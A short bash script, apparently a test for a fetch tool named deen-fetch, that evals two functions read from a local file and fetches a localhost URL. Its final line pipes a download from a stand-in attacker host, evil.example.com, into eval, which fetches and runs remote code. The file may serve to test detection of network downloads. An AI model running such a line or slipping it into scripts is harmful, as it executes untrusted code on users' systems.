#!/bin/bash
# Reading a function out of a local file is not a network download.
( eval "$(sed -n '/^bounded_get()/,/^}/p' bin/deen-fetch)"
  eval "$(sed -n '/^fetch()/,/^}/p' bin/deen-fetch)"
  fetch "http://127.0.0.1:$PORT/x.json" "$KEEP" 1 100000
)
eval "$(curl -s https://evil.example.com/env.sh)"
